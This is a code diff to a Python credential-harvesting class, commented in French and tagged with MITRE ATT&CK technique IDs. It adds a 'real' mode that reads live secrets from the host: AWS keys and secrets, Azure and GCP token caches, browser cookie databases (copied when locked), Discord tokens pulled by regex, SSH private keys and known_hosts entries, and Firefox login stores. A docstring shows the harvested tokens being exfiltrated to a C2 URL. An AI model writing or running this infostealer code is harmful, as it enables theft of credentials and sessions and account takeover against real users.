@@ -49,6 +49,7 @@ class TokenSource(Enum):
     AZURE_CLI = "azure_cli"
     GCP_CLI = "gcp_cli"
     FIREFOX = "firefox"
+    SSH_KEYS = "ssh_keys"   # mode réel : clés privées ~/.ssh (T1552.004)
 
 
 @dataclass
@@ -99,11 +100,299 @@ class TokenHarvester:
                 harvester.exfiltrate(t, c2_url)
     """
 
-    def __init__(self, output_dir: str = "captures/tokens") -> None:
+    def __init__(
+        self,
+        output_dir: str = "captures/tokens",
+        mode: str = "simulated",   # "simulated" (contrat tests) | "real"
+    ) -> None:
         self.output_dir = Path(output_dir)
         self.output_dir.mkdir(parents=True, exist_ok=True)
+        self.mode = mode
         self.tokens: list[HarvestedToken] = []
         self._log_path = self.output_dir / "tokens.jsonl"
+
+    # ------------------------------------------------------------------
+    # Mode RÉEL : chemins filesystem à inspecter (aucun fichier inventé :
+    # on ne rapporte que ce qui existe réellement sur la machine).
+    # ------------------------------------------------------------------
+
+    REAL_FS_PATHS: dict[str, str] = {
+        "aws": "~/.aws/credentials",
+        "gcp": "~/.config/gcloud/application_default_credentials.json",
+        "gcp_legacy": "~/.config/gcloud/credentials.db",
+        "azure": "~/.azure/azureProfile.json",
+        "azure_msal": "~/.azure/msal_token_cache.json",
+        "azure_access_tokens": "~/.azure/accessTokens.json",
+        "ssh": "~/.ssh",
+        "chrome_cookies": "~/Library/Application Support/Google/Chrome/Default/Network/Cookies",
+        "edge_cookies": "~/Library/Application Support/Microsoft Edge/Default/Network/Cookies",
+        "brave_cookies": "~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies",
+        "firefox_profiles": "~/Library/Application Support/Firefox/Profiles",
+        "discord": "~/Library/Application Support/discord/Local Storage/leveldb",
+        "slack": "~/Library/Application Support/Slack/storage",
+    }
+
+    @classmethod
+    def enumerate_real_sources(cls) -> list[dict[str, str]]:
+        """Liste les sources réellement présentes sur cette machine (T1083)."""
+        found = []
+        for name, raw in cls.REAL_FS_PATHS.items():
+            p = Path(raw).expanduser()
+            if p.exists():
+                found.append({"name": name, "path": str(p),
+                              "type": "dir" if p.is_dir() else "file",
+                              "size": p.stat().st_size if p.is_file() else 0})
+        return found
+
+    @staticmethod
+    def _parse_aws_credentials(path: Path) -> list[dict[str, str]]:
+        """Parse INI ~/.aws/credentials → profils {name, access_key_id, secret}."""
+        out: list[dict[str, str]] = []
+        profile = "default"
+        for line in path.read_text(encoding="utf-8", errors="ignore").splitlines():
+            line = line.strip()
+            if line.startswith("[") and line.endswith("]"):
+                profile = line[1:-1]
+            elif "=" in line:
+                k, _, v = line.partition("=")
+                k, v = k.strip().lower(), v.strip()
+                if k in ("aws_access_key_id", "aws_secret_access_key"):
+                    out.append({"profile": profile, "field": k, "value": v})
+        return out
+
+    def _real_harvest_cloud_cli(
+        self, source: TokenSource, hostname: str
+    ) -> list[HarvestedToken]:
+        """Lit RÉELLEMENT ~/.aws/credentials, ~/.azure/*, ~/.config/gcloud."""
+        found: list[HarvestedToken] = []
+        checks: list[tuple[str, Path]] = []
+        if source is TokenSource.AWS_CLI:
+            checks.append(("aws", Path("~/.aws/credentials").expanduser()))
+        elif source is TokenSource.AZURE_CLI:
+            for k in ("azure_msal", "azure_access_tokens", "azure"):
+                checks.append((k, Path(self.REAL_FS_PATHS[k]).expanduser()))
+        elif source is TokenSource.GCP_CLI:
+            for k in ("gcp", "gcp_legacy"):
+                checks.append((k, Path(self.REAL_FS_PATHS[k]).expanduser()))
+        for name, p in checks:
+            if not p.is_file():
+                continue
+            try:
+                if name == "aws":
+                    for cred in self._parse_aws_credentials(p):
+                        found.append(HarvestedToken(
+                            token_id=str(uuid.uuid4()),
+                            source=source,
+                            username=f"{cred['profile']}@aws",
+                            domain="amazonaws.com",
+                            access_token=cred["value"],
+                            scopes=[cred["field"]],
+                            raw_metadata={"real": True, "path": str(p),
+                                          "profile": cred["profile"]},
+                        ))
+                else:
+                    raw = json.loads(p.read_text(encoding="utf-8", errors="ignore"))
+                    blob = json.dumps(raw)[:4096]
+                    found.append(HarvestedToken(
+                        token_id=str(uuid.uuid4()),
+                        source=source,
+                        username=f"cli@{source.value.split('_')[0]}",
+                        domain=p.name,
+                        access_token=blob,
+                        scopes=["real_file"],
+                        raw_metadata={"real": True, "path": str(p),
+                                      "size": p.stat().st_size},
+                    ))
+            except (OSError, ValueError):
+                continue
+        return found
+
+    def _real_harvest_chromium(
+        self, source: TokenSource, hostname: str
+    ) -> list[HarvestedToken]:
+        """Localise la VRAIE base Cookies SQLite (T1555.0003).
+
+        Lecture directe possible (schéma à jour) ; si SQLite est verrouillé
+        par un navigateur ouvert, on copie d'abord (T1005 staging) puis on lit
+        la copie — technique standard d'extraction de cookies.
+        """
+        path_map = {
+            TokenSource.CHROME: "chrome_cookies",
+            TokenSource.EDGE: "edge_cookies",
+            TokenSource.BRAVE: "brave_cookies",
+        }
+        p = Path(self.REAL_FS_PATHS[path_map[source]]).expanduser()
+        if not p.is_file():
+            return []
+        target = p
+        try:
+            conn = sqlite3.connect(f"file:{p}?mode=ro", uri=True)
+            conn.execute("SELECT 1 FROM cookies LIMIT 1").fetchone()
+        except sqlite3.Error:
+            # DB verrouillée → copie de travail puis lecture (comportement réel)
+            tmp = self.output_dir / f".work_{source.value}_cookies.db"
+            try:
+                tmp.write_bytes(p.read_bytes())
+            except OSError:
+                return []
+            target = tmp
+            try:
+                conn = sqlite3.connect(f"file:{tmp}?mode=ro", uri=True)
+            except sqlite3.Error:
+                return []
+        try:
+            rows = conn.execute(
+                "SELECT host_key, name, length(encrypted_value), is_persistent, "
+                "has_expires, expires_utc FROM cookies LIMIT 200"
+            ).fetchall()
+        except sqlite3.Error:
+            rows = []
+        finally:
+            conn.close()
+        if not rows:
+            return []
+        by_host: dict[str, int] = {}
+        for host, _name, _ln, _pers, has_exp, exp_utc in rows:
+            by_host[host] = by_host.get(host, 0) + 1
+        total = sum(n for _, n in by_host.items())
+        exp_chromium = (int(exp_utc) // 1_000_000) - 11644473600 if has_exp else None
+        return [HarvestedToken(
+            token_id=str(uuid.uuid4()),
+            source=source,
+            username=f"{hostname}@local",
+            domain=host,
+            access_token=f"{n} cookies (chiffrés AES-128-CBC/Keychain)",
+            expires_at=exp_chromium,
+            scopes=["cookies"],
+            raw_metadata={"real": True, "db_path": str(p), "host": host,
+                          "cookie_count": n, "total": total},
+        ) for host, n in sorted(by_host.items(), key=lambda kv: -kv[1])[:10]]
+
+    def _real_harvest_discord(
+        self, hostname: str
+    ) -> list[HarvestedToken]:
+        """Cherche un token Discord réel dans le Local Storage leveldb."""
+        ldb = Path(self.REAL_FS_PATHS["discord"]).expanduser()
+        if not ldb.is_dir():
+            return []
+        rx = __import__("re").compile(
+            rb"[MNO][\w-]{23}\.[\w-]{6}\.[\w-]{27}"
+        )
+        found: list[HarvestedToken] = []
+        for f in sorted(ldb.glob("*.ldb"))[:20]:
+            try:
+                hits = set(rx.findall(f.read_bytes()))
+            except OSError:
+                continue
+            for tok in hits:
+                found.append(HarvestedToken(
+                    token_id=str(uuid.uuid4()),
+                    source=TokenSource.DISCORD,
+                    username=f"user@{hostname}",
+                    domain="discord.com",
+                    access_token=tok.decode(),
+                    scopes=["real_leveldb"],
+                    raw_metadata={"real": True, "path": str(f)},
+                ))
+        return found
+
+    def _real_harvest_ssh(self, hostname: str) -> list[HarvestedToken]:
+        """Clés privées SSH RÉELLES de ~/.ssh + empreinte ssh-keygen (T1552.004)."""
+        import subprocess
+        ssh_dir = Path(self.REAL_FS_PATHS["ssh"]).expanduser()
+        if not ssh_dir.is_dir():
+            return []
+        found: list[HarvestedToken] = []
+        # 1) Clés privées
+        for f in sorted(ssh_dir.iterdir()):
+            if not f.is_file():
+                continue
+            try:
+                head = f.read_text(encoding="utf-8", errors="ignore")
+            except OSError:
+                continue
+            if "PRIVATE KEY" not in head:
+                continue
+            kind = ("OPENSSH" if "OPENSSH PRIVATE KEY" in head
+                    else "RSA" if "RSA PRIVATE KEY" in head else "OTHER")
+            fp = ""
+            pub = Path(str(f) + ".pub")
+            if pub.is_file():
+                try:
+                    r = subprocess.run(
+                        ["ssh-keygen", "-lf", str(pub)],
+                        capture_output=True, text=True, timeout=10,
+                    )
+                    if r.returncode == 0:
+                        fp = r.stdout.strip()[:120]
+                except (OSError, subprocess.TimeoutExpired):
+                    fp = ""
+            found.append(HarvestedToken(
+                token_id=str(uuid.uuid4()),
+                source=TokenSource.SSH_KEYS,
+                username=f"{hostname}@local",
+                domain="ssh.local",
+                access_token=(f"clé privée {kind} — {f.name}"
+                              + (f" — {fp}" if fp else "")),
+                scopes=["real_private_key"],
+                raw_metadata={"real": True, "path": str(f), "kind": kind,
+                              "size": f.stat().st_size, "fingerprint": fp},
+            ))
+        # 2) known_hosts : hôtes SSH réellement contactés (T1018,
+        #    cibles de mouvement latéral)
+        for kh_name in ("known_hosts", "known_hosts.old"):
+            kh = ssh_dir / kh_name
+            if not kh.is_file():
+                continue
+            try:
+                lines = kh.read_text(encoding="utf-8", errors="ignore").splitlines()
+            except OSError:
+                continue
+            hosts: dict[str, set[str]] = {}
+            for line in lines:
+                parts = line.split()
+                if len(parts) < 2:
+                    continue
+                host = parts[0].split(",")[0]
+                ktype = parts[1]
+                hosts.setdefault(host, set()).add(ktype)
+            if hosts:
+                found.append(HarvestedToken(
+                    token_id=str(uuid.uuid4()),
+                    source=TokenSource.SSH_KEYS,
+                    username=f"{hostname}@local",
+                    domain="ssh.known_hosts",
+                    access_token=(f"{len(hosts)} hôte(s) SSH réellement contactés: "
+                                  + ", ".join(sorted(hosts)[:5])),
+                    scopes=["real_known_hosts"],
+                    raw_metadata={"real": True, "path": str(kh),
+                                  "hosts": {h: sorted(t) for h, t in hosts.items()}},
+                ))
+        return found
+
+    def _real_harvest_firefox(self, hostname: str) -> list[HarvestedToken]:
+        """Trouve les VRAIS profils Firefox (logins.json / cookies.sqlite)."""
+        prof_root = Path(self.REAL_FS_PATHS["firefox_profiles"]).expanduser()
+        if not prof_root.is_dir():
+            return []
+        found: list[HarvestedToken] = []
+        for prof in sorted(prof_root.iterdir()):
+            if not prof.is_dir():
+                continue
+            markers = [n for n in ("logins.json", "key4.db", "cookies.sqlite")
+                       if (prof / n).is_file()]
+            if markers:
+                found.append(HarvestedToken(
+                    token_id=str(uuid.uuid4()),
+                    source=TokenSource.FIREFOX,
+                    username=prof.name,
+                    domain="mozilla.org",
+                    access_token=f"profil avec {', '.join(markers)}",
+                    scopes=["real_profile"],
+                    raw_metadata={"real": True, "path": str(prof),
+                                  "artifacts": markers},
+                ))
+        return found
 
     # ------------------------------------------------------------------
     # Harvesting - par source
@@ -121,6 +410,22 @@ class TokenHarvester:
         les fichiers réels (Cookies SQLite DPAPI / IndexedDB / etc.).
         """
         harvested: list[HarvestedToken] = []
+
+        # ---- Mode RÉEL : lecture du vrai filesystem, rien d'inventé ----
+        if self.mode == "real":
+            if source in (TokenSource.CHROME, TokenSource.EDGE, TokenSource.BRAVE):
+                harvested.extend(self._real_harvest_chromium(source, hostname))
+            elif source == TokenSource.DISCORD:
+                harvested.extend(self._real_harvest_discord(hostname))
+            elif source == TokenSource.FIREFOX:
+                harvested.extend(self._real_harvest_firefox(hostname))
+            elif source == TokenSource.SSH_KEYS:
+                harvested.extend(self._real_harvest_ssh(hostname))
+            elif source in (TokenSource.AWS_CLI, TokenSource.AZURE_CLI, TokenSource.GCP_CLI):
+                harvested.extend(self._real_harvest_cloud_cli(source, hostname))
+            # Sources sans artefacts connus sur ce FS → 0 token réel (honnête)
+            self.tokens.extend(harvested)
+            return harvested
 
         if source in (TokenSource.CHROME, TokenSource.EDGE, TokenSource.BRAVE):
             harvested.extend(self._harvest_chromium_family(source, hostname))
